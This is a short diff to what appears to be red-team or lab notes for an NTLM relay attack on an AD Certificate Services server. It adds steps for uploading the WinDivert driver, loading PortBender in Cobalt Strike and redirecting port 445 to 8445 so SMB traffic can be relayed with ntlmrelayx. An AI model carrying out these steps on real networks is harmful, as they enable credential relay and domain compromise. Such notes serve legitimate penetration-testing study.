@@ -46,7 +46,10 @@ steps:
 4. ntlmrelayx pointing to the certfnsh.asp page on the adcs server
 
 ```
-
+cd C:\Windows\system32\drivers
+upload C:\Tools\PortBender\WinDivert64.sys
+  **Then go to Cobalt Strike > Script Manager and load PortBender.cna from C:\Tools\PortBender - this adds a new PortBender command to the console.**
+PortBender redirect 445 8445
 ```
 
 
